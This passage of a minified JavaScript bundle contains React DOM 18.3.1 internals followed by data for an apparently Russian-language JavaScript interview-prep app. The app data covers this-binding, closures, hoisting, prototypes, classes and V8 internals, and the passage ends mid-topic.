Error(v(306,r,""))}return n;case 0:return r=n.type,o=n.pendingProps,o=n.elementType===r?o:Re(r,o),Rl(e,n,r,o,t);case 1:return r=n.type,o=n.pendingProps,o=n.elementType===r?o:Re(r,o),Os(e,n,r,o,t);case 3:e:{if(_u(n),e===null)throw Error(v(387));r=n.pendingProps,l=n.memoizedState,o=l.element,su(e,n),Kr(n,r,null,t);var i=n.memoizedState;if(r=i.element,l.isDehydrated)if(l={element:r,isDehydrated:!1,cache:i.cache,pendingSuspenseBoundaries:i.pendingSuspenseBoundaries,transitions:i.transitions},n.updateQueue.baseState=l,n.memoizedState=l,n.flags&256){o=ot(Error(v(423)),n),n=Ds(e,n,r,t,o);break e}else if(r!==o){o=ot(Error(v(424)),n),n=Ds(e,n,r,t,o);break e}else for(he=sn(n.stateNode.containerInfo.firstChild),ge=n,F=!0,Me=null,t=lu(n,null,r,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(nt(),r===o){n=Ge(e,n,t);break e}le(e,n,r,t)}n=n.child}return n;case 5:return au(n),e===null&&Tl(n),r=n.type,o=n.pendingProps,l=e!==null?e.memoizedProps:null,i=o.children,yl(r,o)?i=null:l!==null&&yl(r,l)&&(n.flags|=32),Lu(e,n),le(e,n,i,t),n.child;case 6:return e===null&&Tl(n),null;case 13:return Iu(e,n,t);case 4:return hi(n,n.stateNode.containerInfo),r=n.pendingProps,e===null?n.child=tt(n,null,r,t):le(e,n,r,t),n.child;case 11:return r=n.type,o=n.pendingProps,o=n.elementType===r?o:Re(r,o),Ns(e,n,r,o,t);case 7:return le(e,n,n.pendingProps,t),n.child;case 8:return le(e,n,n.pendingProps.children,t),n.child;case 12:return le(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(r=n.type._context,o=n.pendingProps,l=n.memoizedProps,i=o.value,_(Jr,r._currentValue),r._currentValue=i,l!==null)if(_e(l.value,i)){if(l.children===o.children&&!de.current){n=Ge(e,n,t);break e}}else for(l=n.child,l!==null&&(l.return=n);l!==null;){var s=l.dependencies;if(s!==null){i=l.child;for(var a=s.firstContext;a!==null;){if(a.context===r){if(l.tag===1){a=Je(-1,t&-t),a.tag=2;var c=l.updateQueue;if(c!==null){c=c.shared;var p=c.pending;p===null?a.next=a:(a.next=p.next,p.next=a),c.pending=a}}l.lanes|=t,a=l.alternate,a!==null&&(a.lanes|=t),xl(l.return,t,n),s.lanes|=t;break}a=a.next}}else if(l.tag===10)i=l.type===n.type?null:l.child;else if(l.tag===18){if(i=l.return,i===null)throw Error(v(341));i.lanes|=t,s=i.alternate,s!==null&&(s.lanes|=t),xl(i,t,n),i=l.sibling}else i=l.child;if(i!==null)i.return=l;else for(i=l;i!==null;){if(i===n){i=null;break}if(l=i.sibling,l!==null){l.return=i.return,i=l;break}i=i.return}l=i}le(e,n,o.children,t),n=n.child}return n;case 9:return o=n.type,r=n.pendingProps.children,Yn(n,t),o=xe(o),r=r(o),n.flags|=1,le(e,n,r,t),n.child;case 14:return r=n.type,o=Re(r,n.pendingProps),o=Re(r.type,o),Ms(e,n,r,o,t);case 15:return Ou(e,n,n.type,n.pendingProps,t);case 17:return r=n.type,o=n.pendingProps,o=n.elementType===r?o:Re(r,o),jr(e,n),n.tag=1,fe(r)?(e=!0,Vr(n)):e=!1,Yn(n,t),Ru(n,r,o),El(n,r,o,t),Nl(null,n,r,!0,e,t);case 19:return Au(e,n,t);case 22:return Du(e,n,t)}throw Error(v(156,n.tag))};function Zu(e,n){return Pa(e,n)}function Ef(e,n,t,r){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Ce(e,n,t,r){return new Ef(e,n,t,r)}function Mi(e){return e=e.prototype,!(!e||!e.isReactComponent)}function jf(e){if(typeof e=="function")return Mi(e)?1:0;if(e!=null){if(e=e.$$typeof,e===Xl)return 11;if(e===bl)return 14}return 2}function dn(e,n){var t=e.alternate;return t===null?(t=Ce(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function Mr(e,n,t,r,o,l){var i=2;if(r=e,typeof e=="function")Mi(e)&&(i=1);else if(typeof e=="string")i=5;else e:switch(e){case An:return Pn(t.children,o,l,n);case Gl:i=8,o|=8;break;case bo:return e=Ce(12,t,n,o|2),e.elementType=bo,e.lanes=l,e;case Yo:return e=Ce(13,t,n,o),e.elementType=Yo,e.lanes=l,e;case Zo:return e=Ce(19,t,n,o),e.elementType=Zo,e.lanes=l,e;case aa:return mo(t,o,l,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case ia:i=10;break e;case sa:i=9;break e;case Xl:i=11;break e;case bl:i=14;break e;case Ye:i=16,r=null;break e}throw Error(v(130,e==null?e:typeof e,""))}return n=Ce(i,t,n,o),n.elementType=e,n.type=r,n.lanes=l,n}function Pn(e,n,t,r){return e=Ce(7,e,r,n),e.lanes=t,e}function mo(e,n,t,r){return e=Ce(22,e,r,n),e.elementType=aa,e.lanes=t,e.stateNode={isHidden:!1},e}function Ko(e,n,t){return e=Ce(6,e,null,n),e.lanes=t,e}function Qo(e,n,t){return n=Ce(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function Rf(e,n,t,r,o){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=jo(0),this.expirationTimes=jo(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=jo(0),this.identifierPrefix=r,this.onRecoverableError=o,this.mutableSourceEagerHydrationData=null}function Oi(e,n,t,r,o,l,i,s,a){return e=new Rf(e,n,t,s,a),n===1?(n=1,l===!0&&(n|=8)):n=0,l=Ce(3,null,null,n),e.current=l,l.stateNode=e,l.memoizedState={element:r,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},mi(l),e}function Nf(e,n,t){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:In,key:r==null?null:""+r,children:e,containerInfo:n,implementation:t}}function qu(e){if(!e)return pn;e=e._reactInternals;e:{if(Dn(e)!==e||e.tag!==1)throw Error(v(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(fe(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(v(171))}if(e.tag===1){var t=e.type;if(fe(t))return qa(e,t,n)}return n}function ec(e,n,t,r,o,l,i,s,a){return e=Oi(t,r,!0,e,o,l,i,s,a),e.context=qu(null),t=e.current,r=ie(),o=cn(t),l=Je(r,o),l.callback=n??null,an(t,l,o),e.current.lanes=o,bt(e,o,r),pe(e,r),e}function ho(e,n,t,r){var o=n.current,l=ie(),i=cn(o);return t=qu(t),n.context===null?n.context=t:n.pendingContext=t,n=Je(l,i),n.payload={element:e},r=r===void 0?null:r,r!==null&&(n.callback=r),e=an(o,n,i),e!==null&&(Le(e,o,i,l),xr(e,o,i)),i}function eo(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Bs(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function Di(e,n){Bs(e,n),(e=e.alternate)&&Bs(e,n)}function Mf(){return null}var nc=typeof reportError=="function"?reportError:function(e){console.error(e)};function Li(e){this._internalRoot=e}go.prototype.render=Li.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(v(409));ho(e,n,null,null)};go.prototype.unmount=Li.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;Mn(function(){ho(null,e,null,null)}),n[Ke]=null}};function go(e){this._internalRoot=e}go.prototype.unstable_scheduleHydration=function(e){if(e){var n=Da();e={blockedOn:null,target:e,priority:n};for(var t=0;t<qe.length&&n!==0&&n<qe[t].priority;t++);qe.splice(t,0,e),t===0&&_a(e)}};function _i(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function vo(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Ws(){}function Of(e,n,t,r,o){if(o){if(typeof r=="function"){var l=r;r=function(){var c=eo(i);l.call(c)}}var i=ec(n,r,e,0,null,!1,!1,"",Ws);return e._reactRootContainer=i,e[Ke]=i.current,Ut(e.nodeType===8?e.parentNode:e),Mn(),i}for(;o=e.lastChild;)e.removeChild(o);if(typeof r=="function"){var s=r;r=function(){var c=eo(a);s.call(c)}}var a=Oi(e,0,!1,null,null,!1,!1,"",Ws);return e._reactRootContainer=a,e[Ke]=a.current,Ut(e.nodeType===8?e.parentNode:e),Mn(function(){ho(n,a,t,r)}),a}function yo(e,n,t,r,o){var l=t._reactRootContainer;if(l){var i=l;if(typeof o=="function"){var s=o;o=function(){var a=eo(i);s.call(a)}}ho(n,i,e,o)}else i=Of(t,n,e,o,r);return eo(i)}Ma=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=kt(n.pendingLanes);t!==0&&(ql(n,t|1),pe(n,$()),!(D&6)&&(lt=$()+500,gn()))}break;case 13:Mn(function(){var r=Qe(e,1);if(r!==null){var o=ie();Le(r,e,1,o)}}),Di(e,1)}};ei=function(e){if(e.tag===13){var n=Qe(e,134217728);if(n!==null){var t=ie();Le(n,e,134217728,t)}Di(e,134217728)}};Oa=function(e){if(e.tag===13){var n=cn(e),t=Qe(e,n);if(t!==null){var r=ie();Le(t,e,n,r)}Di(e,n)}};Da=function(){return L};La=function(e,n){var t=L;try{return L=e,n()}finally{L=t}};al=function(e,n,t){switch(n){case"input":if(nl(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var r=t[n];if(r!==e&&r.form===e.form){var o=so(r);if(!o)throw Error(v(90));ca(r),nl(r,o)}}}break;case"textarea":fa(e,t);break;case"select":n=t.value,n!=null&&Qn(e,!!t.multiple,n,!1)}};Sa=ji;wa=Mn;var Df={usingClientEntryPoint:!1,Events:[Zt,Un,so,va,ya,ji]},yt={findFiberByHostInstance:kn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Lf={bundleType:yt.bundleType,version:yt.version,rendererPackageName:yt.rendererPackageName,rendererConfig:yt.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Xe.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Ta(e),e===null?null:e.stateNode},findFiberByHostInstance:yt.findFiberByHostInstance||Mf,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var yr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!yr.isDisabled&&yr.supportsFiber)try{ro=yr.inject(Lf),Fe=yr}catch{}}ye.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Df;ye.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!_i(n))throw Error(v(200));return Nf(e,n,null,t)};ye.createRoot=function(e,n){if(!_i(e))throw Error(v(299));var t=!1,r="",o=nc;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(r=n.identifierPrefix),n.onRecoverableError!==void 0&&(o=n.onRecoverableError)),n=Oi(e,1,!1,null,null,t,!1,r,o),e[Ke]=n.current,Ut(e.nodeType===8?e.parentNode:e),new Li(n)};ye.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(v(188)):(e=Object.keys(e).join(","),Error(v(268,e)));return e=Ta(n),e=e===null?null:e.stateNode,e};ye.flushSync=function(e){return Mn(e)};ye.hydrate=function(e,n,t){if(!vo(n))throw Error(v(200));return yo(null,e,n,!0,t)};ye.hydrateRoot=function(e,n,t){if(!_i(e))throw Error(v(405));var r=t!=null&&t.hydratedSources||null,o=!1,l="",i=nc;if(t!=null&&(t.unstable_strictMode===!0&&(o=!0),t.identifierPrefix!==void 0&&(l=t.identifierPrefix),t.onRecoverableError!==void 0&&(i=t.onRecoverableError)),n=ec(n,null,e,1,t??null,o,!1,l,i),e[Ke]=n.current,Ut(e),r)for(e=0;e<r.length;e++)t=r[e],o=t._getVersion,o=o(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,o]:n.mutableSourceEagerHydrationData.push(t,o);return new go(n)};ye.render=function(e,n,t){if(!vo(n))throw Error(v(200));return yo(null,e,n,!1,t)};ye.unmountComponentAtNode=function(e){if(!vo(e))throw Error(v(40));return e._reactRootContainer?(Mn(function(){yo(null,null,e,!1,function(){e._reactRootContainer=null,e[Ke]=null})}),!0):!1};ye.unstable_batchedUpdates=ji;ye.unstable_renderSubtreeIntoContainer=function(e,n,t,r){if(!vo(t))throw Error(v(200));if(e==null||e._reactInternals===void 0)throw Error(v(38));return yo(e,n,t,!1,r)};ye.version="18.3.1-next-f1338f8080-20240426";function tc(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(tc)}catch(e){console.error(e)}}tc(),ta.exports=ye;var _f=ta.exports,Js=_f;Go.createRoot=Js.createRoot,Go.hydrateRoot=Js.hydrateRoot;const no={1:{label:"INTERN",color:"#8b949e"},2:{label:"JUNIOR",color:"#3fb950"},3:{label:"MIDDLE",color:"#d29922"},4:{label:"SENIOR",color:"#f85149"}},If=[{id:"js",title:"JS",icon:"⚡",color:"#F0DB4F",topics:[{name:"Определение контекста выполнения, случаи применения",level:"2",content:`**Контекст выполнения (Execution Context)** — структура, которая создаётся при каждом вызове функции.

Состоит из двух компонентов:
• **Lexical Environment** — для \`let\`, \`const\`, function declarations
• **Variable Environment** — для \`var\`

**this определяется способом вызова функции, НЕ местом объявления.**

Способы вызова и значение this:
\`\`\`js
obj.method()        // this = obj (метод объекта)
func()              // this = window / undefined (свободный вызов)
func.call(ctx)      // this = ctx (явная привязка)
func.apply(ctx)     // this = ctx (явная привязка)
func.bind(ctx)()    // this = ctx (жёсткая привязка)
new Func()          // this = новый объект
\`\`\`

**Шаги оператора new:**
1. Создаётся пустой объект \`{}\`
2. \`__proto__\` нового объекта → \`Function.prototype\`
3. \`this\` внутри функции указывает на новый объект
4. Выполняется тело функции
5. Если return объект → вернётся он; если примитив/ничего → свой объект`,score:3.5},{name:"Вычисление контекста, его значение по умолчанию",level:"2",content:"**Reference Type** — внутренний тип спецификации. При вычислении `obj.method` движок получает:\n```\n{ base: obj, name: 'method', strict: false }\n```\n\n**GetValue()** — внутренняя операция, которая извлекает значение из Reference Type, уничтожая base.\n\nВызывается при: присваивании (`=`), логических операторах (`||`, `&&`), операторе запятая.\n**НЕ вызывается** при группировке `()`.\n\n```js\nobj.method()              // Reference Type жив → this = obj\n(obj.method)()            // группировка не ломает → this = obj\n(obj.method = obj.method)() // присваивание → GetValue() → this = window\n(false || obj.method)()   // || → GetValue() → this = window\n```\n\n**Boxing (нестрогий режим):**\n• `null` / `undefined` → `window`\n• Примитив → обёртка: `7` → `Number{7}`\n\n```js\nfunction foo() { console.log(this); }\n\n// Нестрогий режим:\nfoo.call(null);      // this → window\nfoo.call(undefined); // this → window\nfoo.call(7);         // this → Number {7}  ← boxing!\nfoo.call('hi');      // this → String {'hi'} ← boxing!\n\n// Strict mode — boxing не происходит:\nfoo.call(7);         // this → 7 (просто примитив)\nfoo.call(null);      // this → null\n```\n\n**Правило:** нестрогий → null/undefined заменяются на window, примитивы оборачиваются в объект. Строгий → что передал, то и получил.",score:2.5},{name:"Сохранение контекста выполнения через замыкание",level:"2",content:`**Замыкание** — функция + её ссылка \`[[Environment]]\` на лексическое окружение, в котором она была создана.

**\`[[Environment]]\`** — скрытое свойство каждой функции, устанавливается в момент **СОЗДАНИЯ** (не вызова!).

Сборщик мусора не удаляет лексическое окружение, пока на него есть ссылка из \`[[Environment]]\`.

**Приём const self = this:**
\`\`\`js
function Timer() {
  this.seconds = 0;
  const self = this; // сохраняем через замыкание
  setInterval(function() {
    self.seconds++;
  }, 1000);
}
\`\`\`

**Классическая задача var + цикл:**
\`\`\`js
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
} // 3, 3, 3

// Решение 1: IIFE
for (var i = 0; i < 3; i++) {
  (function(j) {
    setTimeout(() => console.log(j), 1000);
  })(i);
}

// Решение 2: let
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
} // 0, 1, 2 — спецификация for+let создаёт новое ЛО на каждую итерацию
\`\`\``,score:3},{name:"Потеря контекста",level:"2",content:`**3 случая потери контекста:**

1. **Присваивание метода в переменную:**
\`\`\`js
const fn = obj.greet; // GetValue() → base потерян
fn(); // this = window/undefined
\`\`\`

2. **Передача метода как колбэка:**
\`\`\`js
setTimeout(obj.greet, 1000); // GetValue() → base потерян
\`\`\`

3. **Вложенная функция внутри метода:**
\`\`\`js
const obj = {
  method() {
    function inner() {
      console.log(this); // window — inner имеет base = ЛО (не объект)
    }
    inner();
  }
};
\`\`\`

**4 способа исправить:**
1. **Стрелочная функция** — не создаёт свой this
2. **bind** — возвращает функцию с привязанным this
3. **const self = this** — замыкание
4. **call/apply** — для немедленного вызова`,score:4},{name:"Виды объявления переменных, Function declaration и Function expression, NFE, IIFE",level:"2",content:`**var**: область видимости — функция/скрипт, всплывает с \`undefined\`
**let/const**: область видимости — блок, всплывает как \`uninitialized\` (TDZ)

**Function Declaration vs Expression:**
• FD — полностью всплывает (можно вызвать до объявления)
• FE — следует правилам переменной, в которую присвоен

**Приоритет при одном имени:** function declaration перезаписывает var при всплытии.

**NFE (Named Function Expression):**
\`\`\`js
const sayHi = function greeting() {
  // greeting доступно только здесь
  // хранится в промежуточном ЛО как immutable
  // Перезаписать нельзя
};
greeting(); // ReferenceError — снаружи не видно
\`\`\`
Зачем: надёжная рекурсия (не зависит от внешней переменной) + отладка (имя в stack trace).

**IIFE:** Создаёт изолированную область видимости. До ES6 — основной инструмент модульности. Сейчас заменён \`let/const\`, блоками, модулями.`,score:3.5},{name:"Всплытие переменных",level:"2",content:`Движок проходит код дважды:
1. **Регистрация** — var → \`undefined\`, let/const → \`uninitialized\`, FD → полностью
2. **Выполнение** — построчно

**TDZ (Temporal Dead Zone):** промежуток от начала блока до строки объявления let/const. Обращение → ReferenceError.

\`\`\`js
let x = 'outer';
{
  console.log(x); // ReferenceError, НЕ 'outer'!
  let x = 'inner'; // TS знает о нём с начала блока
}
\`\`\`

**function declaration внутри блока:**
• Нестрогий режим: всплывает только имя как var (\`undefined\`), функция не поднимается
• Strict mode: блочная видимость, не всплывает наружу вообще

**Разница ЛО блока и функции:**
• Функция: Lexical Environment + Variable Environment
• Блок: только Lexical Environment (var пролетает мимо блока)`,score:4},{name:"Что такое замыкание?",level:"2",content:"**Замыкание** — сама функция вместе с её ссылкой `[[Environment]]` на лексическое окружение, в котором она была создана.\n\nТехнически **каждая** функция в JS — замыкание, потому что каждая получает `[[Environment]]`. Заметно когда внутренняя функция живёт дольше внешней.\n\n**Механика:**\n1. Функция создаётся → получает `[[Environment]]` → ссылка на текущее ЛО\n2. Функция вызывается → создаётся новое ЛО, `outer` = `[[Environment]]`\n3. Поиск переменных идёт по цепочке `outer`\n4. `[[Environment]]` уже не участвует — он сделал своё дело на шаге 2\n\nСборщик мусора не удаляет ЛО, пока на него ссылается `[[Environment]]` живой функции.",score:4},{name:"Определение класса. Синтаксис классов. Наследование",level:"2",content:`**typeof class = "function"** — синтаксический сахар.

**Отличия class от функции-конструктора:**
1. Без \`new\` — TypeError
2. Методы неперечислимые
3. Всегда strict mode
4. Не всплывает

**extends создаёт ДВЕ цепочки:**
\`\`\`js
Admin.prototype.__proto__ === User.prototype // для экземпляров
Admin.__proto__ === User                     // для статики
\`\`\`

**super():**
• В конструкторе — вызывает конструктор родителя, создаёт this
• В методе — обращается к методу родительского прототипа
• Без super() в дочернем конструкторе — ReferenceError при обращении к this

**User.prototype** по умолчанию = \`{ constructor: User }\`

**Приватные методы:**
\`\`\`js
class User {
  #name;
  constructor(name) { this.#name = name; }
  #validate() { return this.#name.length > 0; }
  getName() { return this.#validate() ? this.#name : null; }
}
\`\`\`

**Порядок инициализации полей:**
1. Поля родителя (class fields)
2. Конструктор родителя (super())
3. Поля дочернего класса
4. Конструктор дочернего класса

**Mixin-паттерн** (псевдо-множественное наследование):
\`\`\`js
const Serializable = (Base) => class extends Base {
  serialize() { return JSON.stringify(this); }
};
const Validatable = (Base) => class extends Base {
  validate() { return Object.values(this).every(v => v !== null); }
};
class User extends Serializable(Validatable(EventEmitter)) { ... }
\`\`\`
Каждый mixin — функция (Base) => class extends Base. Цепочка прототипов линейна, нет diamond problem.`,score:3.5},{name:"Подмена существующего контекста",level:"2",content:`**call(ctx, a, b)** — вызывает сразу, аргументы через запятую
**apply(ctx, [a, b])** — вызывает сразу, аргументы массивом (A = Array)
**bind(ctx)** — НЕ вызывает, возвращает новую функцию

**bind привязывает навсегда.** Повторный bind/call/apply не перебьёт. Под капотом создаётся exotic object с \`[[BoundThis]]\`.

**Стрелочная функция** — подмена this НЕВОЗМОЖНА. call/apply/bind игнорируются. this ищется как переменная по \`[[Environment]]\`.

**React классовые компоненты:**
\`\`\`js
// Вариант 1: bind в конструкторе
this.handleClick = this.handleClick.bind(this);

// Вариант 2: стрелочная функция как поле класса
handleClick = () => { ... }
\`\`\``,score:3},{name:"Лексическое окружение",level:"3",content:`**Лексическое окружение (Lexical Environment)** — структура данных, хранящая:
• **Environment Record** — привязки идентификаторов к значениям
• **outer** — ссылка на внешнее ЛО

Создаётся при каждом вызове функции и для каждого блока (для let/const).

**Поиск переменных:** своё ЛО → outer → ... → глобальное ЛО → null → ReferenceError

**\`[[Environment]]\`:**
• Устанавливается в момент **создания** функции
• При вызове функции: новое ЛО, его outer = \`[[Environment]]\`

**Промежуточное ЛО у NFE:**
\`\`\`
Внутреннее ЛО функции
  ↓ outer
Промежуточное { greeting: <функция> } (immutable)
  ↓ outer
Внешнее ЛО
\`\`\``,score:4.5},{name:"Определение прототипа. Цепочка прототипов, механизм поиска свойств",level:"3",content:`**\`[[Prototype]]\`** — скрытое свойство объекта, доступно через \`__proto__\` (геттер/сеттер).

**Два механизма поиска:**
• Переменные: по цепочке outer (статически, при создании) → ReferenceError
• Свойства: по цепочке __proto__ (динамически, можно менять) → undefined

**Shadowing:** запись свойства ВСЕГДА на самом объекте, не поднимается по цепочке.

**this в методе прототипа:** неважно где метод найден, this = объект перед точкой.

\`\`\`js
hasOwnProperty('prop')  // проверка собственного свойства
for...in                // включая прототип
Object.keys()           // только собственные
\`\`\`

**Конец цепочки:** Object.prototype → null

**Object.create():**
\`\`\`js
// Создать объект с конкретным прототипом
const animal = { breathe() { return true; } };
const dog = Object.create(animal);
dog.bark = () => 'Woof';
Object.getPrototypeOf(dog) === animal; // true

// Объект без прототипа — чистый hash map (нет toString, hasOwnProperty и т.д.)
const map = Object.create(null);
map['key'] = 'value'; // никогда не конфликтует с prototype методами
\`\`\`

**Object.getPrototypeOf vs __proto__:**
\`__proto__\` — устаревший геттер/сеттер на Object.prototype.
\`Object.getPrototypeOf(obj)\` — стандартный API, используй его.
\`Object.setPrototypeOf(obj, proto)\` — изменить прототип у существующего объекта. Избегай в горячем коде: переводит объект в slow mode (V8 сбрасывает Hidden Class).`,score:4},{name:"Особенности стрелочных функций. Отличия от классических",level:"3",content:"**6 отличий:**\n1. Нет своего this — берёт из `[[Environment]]`\n2. Нет `arguments`\n3. Нельзя вызвать через `new`\n4. Нет свойства `prototype`\n5. Не может быть генератором\n6. Краткий синтаксис\n\nthis внутри стрелочной функции **есть** и работает, но она не создаёт **свой**. Ищет как обычную переменную по цепочке ЛО.\n\n`call/apply/bind` полностью **игнорируются** — подменить this невозможно.",score:4},{name:"Принципы работы сборщика мусора в V8",level:"4",content:`**Принцип достижимости (reachability):** всё, до чего можно добраться от корней — живое.

**Корни (roots):**
1. Глобальный объект (window/global)
2. Стек вызовов (локальные переменные выполняющихся функций)
3. Замыкания (ЛО со ссылками из живых функций)

**Два поколения памяти:**

**Young Generation → Scavenger (Minor GC):**
• Маленькая область для новых объектов
• Два полупространства: from-space и to-space
• Живые копируются в to-space, from-space очищается, роли меняются
• Быстрый, частый

**Old Generation → Mark-Sweep-Compact (Major GC):**
• Mark — помечает живые от корней
• Sweep — освобождает непомеченные
• Compact — уплотняет, убирая фрагментацию
• Медленный, редкий

**Promotion:** объект пережил 2 сборки в Young → Old

**Оптимизации пауз GC в V8:**
• Incremental Marking:
Фаза Mark в Mark-Sweep-Compact — самая долгая, потому что нужно обойти весь граф объектов от корней. Вместо того чтобы делать это за один раз и блокировать основной поток на десятки-сотни миллисекунд, V8 разбивает обход на маленькие порции по 5-10мс. Между порциями выполняется JavaScript. Проблема — пока мы помечали объекты порциями, JS-код мог создать новые ссылки или удалить старые. Для этого используется write barrier — при каждой записи свойства V8 отмечает изменённые объекты и перепроверяет их при следующей порции.
• Concurrent Marking/Sweeping/Compacting:
Фазы Sweep и Compact выполняются в отдельных потоках (worker threads), параллельно с основным JS-потоком. Основной поток продолжает выполнять JS, а воркеры в это время освобождают и уплотняют память. Начиная с 2018 года V8 также делает concurrent marking — часть фазы Mark тоже выполняется в параллельных потоках, а основной поток только финализирует результат.
• Lazy Sweeping:
После фазы Mark движок знает какие объекты мёртвые, но не торопится их очищать. Sweep происходит лениво — только когда нужно выделить новую память и текущая страница заполнена. Если памяти хватает — sweep откладывается. Это размазывает стоимость очистки во времени.
Итого эффект:
Без оптимизаций пауза Major GC могла занимать 100-500мс (заметный фриз UI). С оптимизациями — основной поток блокируется на 1-5мс за раз, остальное параллельно или инкрементально.`,score:2.5},{name:"Процесс обработки кода в V8: AST, лексический анализ, JIT, деоптимизация",level:"4",content:`**Pipeline V8:**
\`\`\`
Исходный код → Токены → AST → Байткод (Ignition) → Машинный код (TurboFan)
\`\`\`

**Процесс обработки кода в V8:**

**1. Лексический анализ (Tokenization/Lexing):**
Движок получает исходный код как текст. Первым делом разбивает его на токены — минимальные значимые единицы. Например const x = 10 + 5; → [const][x][=][10][+][5][;]. Каждый токен имеет тип (ключевое слово, идентификатор, оператор, число, пунктуация).
V8 делает это двумя способами:

Eager parsing (полный) — для кода, который нужен прямо сейчас (верхний уровень скрипта, немедленно вызываемые функции)
Lazy parsing (pre-parsing) — для тел функций, которые могут никогда не вызваться. Pre-parser не строит AST, только проверяет синтаксические ошибки и запоминает границы функции (где начинается, где заканчивается). Полный парсинг произойдёт только при первом вызове. Это критично для ускорения старта — представь бандл на 2MB JS, из которого при загрузке реально выполняется 20%.

**2. Синтаксический анализ (Parsing) → AST:**
Из плоского списка токенов строится Abstract Syntax Tree — дерево, где каждый узел представляет операцию или конструкцию. AST нужен потому что токены — плоский список, а код имеет вложенную структуру: приоритеты операций (* раньше +), вложенные блоки, scope. Дерево разрешает эти связи и позволяет дальше генерировать код и оптимизировать.

**3. Ignition (интерпретатор) → байткод:**
AST передаётся в Ignition — интерпретатор V8. Он генерирует байткод — промежуточное низкоуровневое представление, но не машинный код. Байткод генерируется быстро и выполняется сразу — это даёт быстрый старт. Пользователь видит страницу не дожидаясь тяжёлой компиляции. Параллельно Ignition собирает профилирующую информацию: какие функции вызываются часто, какие типы аргументов приходят, какие ветки if/else выполняются.

**4. TurboFan (оптимизирующий компилятор) → машинный код:**
Когда функция вызывается достаточно часто (становится «горячей»), Ignition передаёт её байткод и собранный профиль в TurboFan. TurboFan выполняет спекулятивную оптимизацию — на основе профиля предполагает типы и генерирует оптимизированный машинный код. Например, если add(a, b) 10000 раз получала числа — TurboFan генерирует машинный код для сложения чисел напрямую, без проверок типов, без boxing, с использованием CPU-инструкций для целочисленной арифметики.

**5. Деоптимизация (Deoptimization):**
Если предположения TurboFan оказались неверны (пришла строка вместо числа, объект другой формы) — оптимизированный машинный код выбрасывается, и функция возвращается к выполнению через байткод в Ignition. Это называется bailout. Функция снова работает медленно, но корректно. Ignition продолжит собирать профиль, и если увидит новую стабильную закономерность — TurboFan попробует оптимизировать заново, уже с учётом новых типов.
Практические следствия:

